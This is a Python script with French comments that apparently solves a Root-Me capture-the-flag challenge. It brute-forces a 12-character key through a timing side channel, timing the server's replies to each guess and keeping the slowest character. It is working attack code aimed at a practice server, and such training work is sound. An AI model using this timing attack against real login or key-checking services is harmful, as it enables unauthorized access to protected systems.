import socket
import time

host = "challenge01.root-me.org"
port = 51015

charset = "0123456789-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"  # tout les char

# La clé que nous essayons de deviner
key = ['0'] * 12  # Commencez par 12 '0'

for i in range(12):  # Pour chaque caractère de la clé
    best_char = '0'
    longest_response_time = 0

    for char in charset:  # Essayez chaque caractère possible
        # Changez le i-ème caractère de la clé
        key[i] = char
        trial_key = ''.join(key)

        # Créez un nouveau socket pour chaque essai
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        # Recevez le message d'accueil
        data = s.recv(1024)
        print("Received data: ", data.decode())

        # Envoyez la clé
        start_time = time.time()
        s.send((trial_key + '\n').encode())  # Assurez-vous d'envoyer une nouvelle ligne à la fin de la clé

        # Recevez la réponse
        data = s.recv(1024)
        end_time = time.time()

        response_time = end_time - start_time
        print("Key: ", trial_key)
        print("Response time: ", response_time)
        print("Received data: ", data.decode())

        # Fermez le socket pour cet essai
        s.close()

        # Si le temps de réponse est plus long que le temps de réponse le plus long que nous avons vu jusqu'à présent,
        # Mettez à jour le meilleur caractère et le temps de réponse le plus long.
        if response_time > longest_response_time:
            best_char = char
            longest_response_time = response_time

    # Après avoir essayé tous les caractères, choisissez le caractère qui a donné le temps de réponse le plus long
    key[i] = best_char
    print("Current key: ", ''.join(key))

print("Key found: ", ''.join(key))
